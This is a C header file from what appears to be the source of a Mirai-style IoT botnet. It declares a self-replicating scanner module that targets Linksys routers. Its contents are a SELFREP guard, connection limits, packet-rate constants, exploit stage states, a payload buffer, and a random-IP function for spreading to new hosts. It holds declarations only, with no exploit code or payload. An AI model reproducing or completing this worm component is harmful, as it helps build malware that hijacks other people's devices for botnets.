#ifdef SELFREP
#pragma once

#include <stdint.h>
#include "includes.h"

#ifdef X86_64
#define linksys_SCANNER_MAX_CONNS 512
#define linksys_SCANNER_RAW_PPS 1440
#else
#define linksys_SCANNER_MAX_CONNS 256
#define linksys_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define linksys_SCANNER_RDBUF_SIZE 1024
#define linksys_SCANNER_HACK_DRAIN 64
#else
#define linksys_SCANNER_RDBUF_SIZE 1024
#define linksys_SCANNER_HACK_DRAIN 64
#endif


struct linksys_scanner_connection
{
    int fd, last_recv;
    enum
    {
        linksys_SC_CLOSED,
        linksys_SC_CONNECTING,
        linksys_SC_EXPLOIT_STAGE2,
        linksys_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[linksys_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void linksys_scanner_init();
void linksys_scanner_kill(void);

static void linksys_setup_connection(struct linksys_scanner_connection *);
static ipv4_t linksys_get_random_ip(void);

#endif
